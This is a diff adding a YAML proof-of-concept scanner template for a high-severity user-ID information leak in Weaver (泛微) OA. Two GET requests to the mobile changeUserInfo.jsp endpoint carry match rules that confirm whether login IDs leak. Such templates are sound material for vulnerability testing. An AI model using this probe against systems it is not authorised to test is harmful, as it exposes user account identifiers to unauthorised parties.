@@ -1,0 +1,22 @@
+id: poc-yaml-weaver-changeuserinfo-userid-leak
+info:
+  name: 泛微OA 用户 id 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: weaver
+requests:
+- method: GET
+  path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=1
+  expression: 'status_code == 200 &&  contains(body, "status\":\"0") && !contains(body,
+    "<")
+
+    '
+- method: GET
+  path: /mobile/plugin/changeUserInfo.jsp?type=getLoginid&mobile=09747812138193
+  expression: 'status_code == 200 &&  contains(body, "status\":\"-1") && !contains(body,
+    "<")
+
+    '
+variables: {}
+transport: http
